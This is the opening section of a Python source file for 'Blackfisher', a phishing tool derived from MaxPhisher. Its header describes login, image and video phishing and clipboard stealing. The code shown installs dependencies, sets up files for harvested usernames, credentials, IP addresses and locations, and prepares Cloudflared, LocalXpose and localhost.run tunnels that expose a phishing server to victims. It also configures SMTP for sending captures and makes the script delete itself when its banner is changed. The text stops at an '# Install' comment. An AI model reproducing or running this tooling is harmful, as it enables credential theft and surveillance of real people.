# Blackfisher
Thanks 
# -*- coding: UTF-8 -*-
# ToolName   : Blackfisher
# Author     : Kuldeepkaswan
# Version    : 1.1
# License    : MIT
# Copyright  : kuldeep (2021-2022)
# Github     : https://github.com/KasRoudra
# Contact    : https://m.me/KasRoudra
# Description: Blackfisher is a phishing tool in python
# Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
# 1st Commit : 08/9/2022
# Language   : Python
# Portable file/script
# If you copy open source code, consider giving credit
# Credits    : PyPhisher, VidPhisher, CamHacker, IP-Tracker, StromBreaker, Seeker
# Env        : #!/usr/bin/env python


"""
MIT License

Copyright (c) 2022 KasRoudra

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from argparse import ArgumentParser
from importlib import import_module as eximport
from glob import glob
from hashlib import sha256
from json import (
    dumps as stringify,
    loads as parse
)
from os import (
    getenv,
    kill,
    listdir,
    mkdir,
    mknod,
    popen,
    remove,
    rename,
    replace,
    system
)
from os.path import (
    abspath,
    basename,
    dirname,
    isdir,
    isfile,
    join
)
from platform import uname
from re import search, sub
from shutil import (
    copy2,
    copyfile,
    copytree,
    get_terminal_size,
    rmtree,
)
from signal import (
    SIGINT,
    SIGKILL,
    SIGTERM
)
from subprocess import (
    DEVNULL,
    PIPE,
    Popen,
    STDOUT,
    call,
    run
)
from smtplib import SMTP_SSL as smtp
from socket import (
    AF_INET as inet,
    SOCK_STREAM as stream,
    setdefaulttimeout,
    socket
)
from sys import (
    argv,
    stdout,
    version_info
)
from tarfile import open as taropen
from time import (
    ctime,
    sleep,
    time
)
from zipfile import ZipFile


# Color snippets
black="\033[0;30m"
red="\033[0;31m"
bred="\033[1;31m"
green="\033[0;32m"
bgreen="\033[1;32m"
yellow="\033[0;33m"
byellow="\033[1;33m"
blue="\033[0;34m"
bblue="\033[1;34m"
purple="\033[0;35m"
bpurple="\033[1;35m"
cyan="\033[0;36m"
bcyan="\033[1;36m"
white="\033[0;37m"
nc="\033[00m"

version="1.1"

# Regular Snippets
ask  =     f"{green}[{white}?{green}] {yellow}"
success = f"{yellow}[{white}√{yellow}] {green}"
error  =    f"{blue}[{white}!{blue}] {red}"
info  =   f"{yellow}[{white}+{yellow}] {cyan}"
info2  =   f"{green}[{white}•{green}] {purple}"

# Generated by banner-generator. Github: https://github.com/KasRoudra/banner-generator

# Modifying this could be potentially dangerous
logo = f"""
{red}                (\_/) 
{cyan}|            (•.•) 
{yellow}|          (   ) 
{blue}| black
{red}| blackfisher
{yellow}{" "*31}             [{blue}v{version}{yellow}]
{cyan}{" "*28}        [{blue}By {green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{cyan}]
"""

lx_help = f"""
{info}Steps: {nc}
{blue}[1]{yellow} Go to {green}https://localxpose.io
{blue}[2]{yellow} Create an account 
{blue}[3]{yellow} Login to your account
{blue}[4]{yellow} Visit {green}https://localxpose.io/dashboard/access{yellow} and copy your authtoken
"""

packages = [ "php", "ssh" ]
modules = [ "requests", "bs4", "rich" ]
tunnelers = [ "cloudflared", "loclx" ]
processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
extensions = [ "png", "gif", "webm", "mkv", "mp4", "mp3", "wav", "ogg" ]

try:
    test = popen("cd $HOME && pwd").read()
except:
    exit()

supported_version = 3

if version_info[0] != supported_version:
    print(f"{error}Only Python version {supported_version} is supported!\nYour python version is {version_info[0]}")
    exit(0)

for module in modules:
    try:
        eximport(module)
    except ImportError:
        try:
            print(f"Installing {module}")
            run(f"pip3 install {module}", shell=True)
        except:
            print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
            exit(1)
    except:
        exit(1)

for module in modules:
    try:
        eximport(module)
    except:
        print(f"{module} cannot be installed! Install it manually by {green}'pip3 install {module}'")
        exit(1)

from bs4 import BeautifulSoup
from requests import ( 
    get,
    head, 
    Session
) 
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    TextColumn,
    TimeRemainingColumn,
    TransferSpeedColumn
)
from rich.traceback import install as override_default_traceback

override_default_traceback()
cprint = Console().print

# Get Columns of Screen
columns = get_terminal_size().columns

repo_url = "https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61/MaxPhisher"
sites_repo = "https://github.com/KasRoudra2/maxfiles"
websites_url = f"{sites_repo}/archive/main.zip"
repo_branch = "maxfiles-main"

# CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun

home = getenv("HOME")
ssh_dir = f"{home}/.ssh"
sites_dir = f"{home}/.maxsites"
templates_file = f"{sites_dir}/templates.json"
tunneler_dir = f"{home}/.tunneler"
php_file = f"{tunneler_dir}/php.log"
cf_file = f"{tunneler_dir}/cf.log"
lx_file = f"{tunneler_dir}/loclx.log"
lhr_file = f"{tunneler_dir}/lhr.log"
site_dir = f"{home}/.site"
cred_file = f"{site_dir}/usernames.txt"
ip_file = f"{site_dir}/ip.txt"
info_file = f"{site_dir}/info.txt"
location_file = f"{site_dir}/location.txt"
log_file = f"{site_dir}/log.txt"
main_ip = "ip.txt"
main_info = "info.txt"
main_cred = "creds.txt"
main_location = "location.txt"
cred_json = "creds.json"
info_json = "info.json"
location_json = "location.json" 
email_file = "files/email.json"
error_file = "error.log"
is_mail_ok = False
redir_url = ""
email = ""
password = ""
receiver = ""
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"
if isdir("/data/data/com.termux/files/home"):
    termux = True
    cf_command = f"termux-chroot {cf_command}"
    lx_command = f"termux-chroot {lx_command}"
    saved_file = "/sdcard/.creds.txt"
else:
    termux = False
    saved_file = f"{home}/.creds.txt"


print(f"\n{info}Please wait!{nc}")


default_port = 8080
default_tunneler = "Cloudflared"
default_fest = "Birthday"
default_ytid = "6hHmkInZkMQ"
default_duration = 5000
default_type = "2"
default_template = "1"


if termux:
    default_dir = "/sdcard/Media"
else:
    default_dir = f"{home}/Media"
if not isdir(default_dir):
   mkdir(default_dir)

argparser = ArgumentParser()

argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"MaxPhisher's server port [Default : {default_port}]")
argparser.add_argument("-t", "--type", help="MaxPhisher's phishing type index [Default : null]")
argparser.add_argument("-o", "--option", help="MaxPhisher's template index [ Default : null ]")
argparser.add_argument("-T", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
argparser.add_argument("-S", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
argparser.add_argument("-d", "--directory", default=default_dir, help=f"Directory where media files will be saved [Default : {default_dir}]")
argparser.add_argument("-f", "--fest", default=default_fest, help=f"Festival name for fest template [Default: {default_fest}]")
argparser.add_argument("-i", "--ytid", default=default_ytid, help=f"Youtube video ID for yttv template [Default : {default_ytid} (NASA Video)]")
argparser.add_argument("-u", "--url", help="Redirection url for ip-tracking or login phishing [Default : null]")
argparser.add_argument("-s", "--duration", type=int, default=default_duration, help=f"Media duration while capturing [Default : {default_duration}(ms)]")
argparser.add_argument("-m", "--mode", help="Mode of MaxPhisher [Default: normal]")
argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
argparser.add_argument("--nokey", help="Use localtunnel without ssh key [Default: False]", action="store_false")
argparser.add_argument("--noupdate", help="Skip update checking [Default : False]", action="store_false")


args = argparser.parse_args()

port = args.port
ptype = args.type
option = args.option
region = args.region
subdomain = args.subdomain
tunneler = args.tunneler
fest = args.fest
ytid = args.ytid
url = args.url
directory = args.directory
duration = args.duration
mode = args.mode
troubleshoot = args.troubleshoot
key = args.nokey if mode != "test" else False
update = args.noupdate

local_url = f"127.0.0.1:{port}"

ts_commands = {
    "cloudflared": f"{cf_command} tunnel -url {local_url}",
    "localxpose": f"{lx_command} tunnel http -t {local_url}",
    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
    "cf": f"{cf_command} tunnel -url {local_url}",
    "loclx": f"{lx_command} tunnel http -t {local_url}",
    "lhr": f"ssh -R 80:{local_url} localhost.run -T -n"
}

# My utility functions

# Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
def is_installed(package):
    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
    if exit_code == 0:
        return True
    return False


# Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
def is_running(process):
    exit_code = bgtask(f"pidof {process}").wait()
    if exit_code == 0:
        return True
    return False


# Check if a json is valid
def is_json(myjson):
  try:
    parse(myjson)
    return True
  except:
    return False


# A simple copy function
def copy(path1, path2):
    if isdir(path1):
        if isdir(path2):
             rmtree(path2)
        copytree(path1, path2)
    if isfile(path1):
        if isdir(path2):
            copy2(path1, path2)

# Delete files/folders if exist
def delete(*paths, recreate=False):
    for path in paths:
        if isdir(path):
            if recreate:
                rmtree(path)
                mkdir(path)
            else:
                rmtree(path)
        if isfile(path): 
            remove(path)


# A poor alternative of GNU/Linux 'cat' command returning file content
def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""


# Another poor alternative of GNU/Linux 'sed' command to replace and write
def sed(text1, text2, filename1, filename2=None, occurences=None):
    filedata1 = cat(filename1)
    if filename2 is None:
        filename2 = filename1
    if occurences is None:
        filedata2 = filedata1.replace(text1, text2)
    else:
        filedata2 = filedata1.replace(text1, text2, occurences)
    write(filedata2, filename2)
        
# Another poor alternative of GNU/Linux 'grep' command for regex search
def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

# Write/Append texts to a file
def write(text, filename):
    with open(filename, "w") as file:
        file.write(str(text)+"\n")

# Write/Append texts to a file
def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")


# Print lines slowly
def sprint(text, second=0.05):
    for line in text + '\n':
        stdout.write(line)
        stdout.flush()
        sleep(second)
        
# Prints colorful texts
def lolcat(text):
    if is_installed("lolcat"):
        run(["lolcat"], input=text, text=True)
    else:
        print(text)

# Center text 
def center_text(text):
    lines = text.splitlines()
    if len(lines) > 1:
        minlen = min([len(line) for line in lines if len(line)!=0]) + 8
        new_text = ""
        for line in lines:
            padding = columns + len(line) - minlen
            if columns % 2 == 0 and padding % 2 == 0:
                padding += 1
            new_text += line.center(padding) + "\n"
        return new_text
    else:
        return text.center(columns+8)



# Print decorated file content
def show_file_data(file):
    lines = cat(file).splitlines()
    text = ""
    for line in lines:
        text += f"[cyan][[/][green]*[/][cyan]][/][yellow] {line}[/]\n"
    cprint(
        Panel(
            text.strip(),
            title="[bold green]\x4d\x61\x78\x50\x68\x69\x73\x68\x65\x72[/][cyan] Data[/]", 
            title_align="left",
            border_style="blue",
        )
    )

# Generate json file from txt
def text2json(text):
    json = {}
    lines = text.splitlines()
    for line in lines:
        if ":" in line:
            key = line.split(":")[0]
            value = line.split(":")[1]
            for i in line:
                json[key.strip()] = value.strip()
    return json

# Append new entry in array and write in json file
def add_json(json, filename):
    content = cat(filename)
    if is_json(content) or content == "":
        if content == "":
            new_content = []
        if is_json(content):
            new_content = parse(content)
        if isinstance(new_content, list):
            new_content.append(json)
            string = stringify(new_content, indent=2)
            write(string, filename)
            

# Run shell commands in python
def shell(command, capture_output=False):
    try:
        return run(command, shell=True, capture_output=capture_output)
    except Exception as e:
        append(e, error_file)
    # return run(command.split(" "), shell=True)
    # return call(command, shell=True)
    
# Run task in background supressing output by setting stdout and stderr to devnull
def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)


def get_meta(url):
    # Facebook requires some additional header
    if "facebook" in url:
        headers = {
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "dnt": "1", 
            "content-type": "application/x-www-form-url-encoded",
            "origin": "https://m.facebook.com",
            "referer": "https://m.facebook.com/", 
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors", 
            "sec-fetch-user": "empty", 
            "sec-fetch-dest": "document", 
            "sec-ch-ua-platform": "Android",
            "accept-encoding": "gzip, deflate br", 
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        }
    else:
        headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        }
    allmeta = ""
    try:
        response = get(url, headers=headers).text
        soup = BeautifulSoup(response, "html.parser")
        metas = soup.find_all("meta")
        if metas is not None and metas!=[]:
            allmeta = "\n".join([str(meta) for meta in metas])
    except Exception as e:
        append(e, error_file)
    return allmeta
    
# Replace the default ugly exception message
def exception_handler(e):
    lines_arr = []
    tb = e.__traceback__
    while tb is not None:
        if tb.tb_frame.f_code.co_filename == abspath(__file__):
            lines_arr.append(str(tb.tb_lineno))
        tb = tb.tb_next
    name = type(e).__name__
    append(e, error_file)
    if ":" in str(e):
        message = str(e).split(":")[0]
    elif "(" in str(e):
        message = str(e).split("(")[0]
    else:
        message = str(e)
    line_no = lines_arr[len(lines_arr) - 1]
    lines_no = ", ".join(lines_arr)
    print(f"{error}{name}: {message} at lines {lines_no}")
    
if sha256(logo.encode("utf-8")).hexdigest() != "d32253dd88b2225241185c161e4919c04f5ed52dd9291312234fb2052479116a":
    print(f"{info}Visit: {repo_url}")
    bgtask(f"xdg-open {repo_url}")
    delete(__file__)
    exit(1)
   
# Website chooser
def show_options(sites, is_main=True, is_login=False):
    total_sites = len(sites)
    def optioner(index, max_len):
        # Avoid RangeError/IndexError
        if index >= total_sites:
            return ""
        # Add 0 before single digit number
        new_index = str(index+1) if index >= 9 else "0"+str(index+1) 
        # To fullfill max length of a part we append empty space
        space = " " * (max_len - len(sites[index]))
        return f"{green}[{white}{new_index}{green}] {yellow}{sites[index]}{space}"
    # Array index starts from 0
    first_index = 0
    # Three columns
    one_third = int(total_sites/3)
    # If there is modulus, that means some entries are remaining, we need an extra row
    if total_sites%3 > 0:
        one_third += 1
    options = "\n\n"
    # First index of last line should be less than one-third of total
    while first_index < one_third and total_sites > 10:
        second_index = first_index + one_third
        third_index = second_index + one_third
        options += optioner(first_index, 23) + optioner(second_index, 17) + optioner(third_index, 1) + "\n"
        first_index += 1
    if total_sites < 10:
        for i in range(total_sites):
            options += optioner(i, 20) + "\n"
    options += "\n"
    if is_main:
        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} More tools        {green}[{white}0{green}]{yellow} Exit\n\n"
    else:
        if is_login and isfile(saved_file) and cat(saved_file)!="":
            options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit\n\n"
        else:
            options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
    lolcat(options)

# Clear the screen and show logo
def clear(fast=False, lol=False):
    shell("clear")
    if fast:
        print(logo)
    elif lol:
        lolcat(logo)
    else:
        sprint(logo, 0.01)
        
        

# Install
